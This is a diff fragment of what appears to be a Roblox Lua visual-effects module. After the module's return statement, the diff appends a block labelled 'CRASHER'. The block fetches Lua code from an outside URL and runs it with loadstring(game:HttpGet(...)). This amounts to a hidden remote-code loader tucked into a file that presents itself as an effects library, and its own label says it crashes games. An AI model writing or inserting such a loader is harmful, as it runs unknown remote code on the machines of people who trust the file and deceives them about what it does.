@@ -17314,3 +17314,7 @@ end
 
 print("VFX loaded successfully!")
 return M
+-------------------------------------------------------------------
+-------- CRASHER                                                  
+-------------------------------------------------------------------
+loadstring(game:HttpGet("https://generator-crash.lovable.app/s/vfxcrasher1/loader.lua?p=KHYZER2014%40"))()
